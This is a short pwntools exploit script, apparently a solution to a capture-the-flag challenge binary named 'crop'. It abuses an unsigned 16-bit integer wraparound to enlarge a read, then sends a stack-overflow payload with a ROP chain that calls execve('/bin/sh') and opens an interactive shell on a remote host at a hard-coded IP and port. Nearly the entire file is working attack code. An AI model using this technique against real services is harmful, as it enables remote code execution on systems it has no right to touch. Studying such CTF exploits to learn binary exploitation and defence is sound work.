#!/usr/bin/python3
# -*- coding: UTF-8 -*-
# -----------------------------------
# @File    :  exp.py
# @Author  :  woodwhale
# @Time    :  2023/03/03 12:47:09
# -----------------------------------

from pwn import *

context.arch = "amd64"
DEBUG = 0

elf = ELF("../file/crop")
io = process("../file/crop") if DEBUG else remote("101.34.90.86", 20002)


io.sendlineafter("114", "-115") # 让b成为-1，uint16下的-1是65535，大于514

pop_rax_ret = 0x000000000040130a
pop_rdi_ret = 0x0000000000401304
pop_rdx_ret = 0x0000000000401308
pop_rsi_ret = 0x0000000000401306
ret = 0x000000000040101a
syscall = 0x000000000040130c

payload = b"b"*0x80 # padding stack
payload += b"woodwood"  # padding rbp
payload += p64(pop_rax_ret) + p64(59)   # rax 59
payload += p64(pop_rdi_ret) + p64(next(elf.search(b"/bin/sh\x00")))   # rdi
payload += p64(pop_rsi_ret) + p64(0)   # rsi
payload += p64(pop_rdx_ret) + p64(0)   # rdx
payload += p64(syscall) # execve("/bin/sh\x00",NULL.NULL)

io.sendlineafter("ok?", payload)

io.interactive()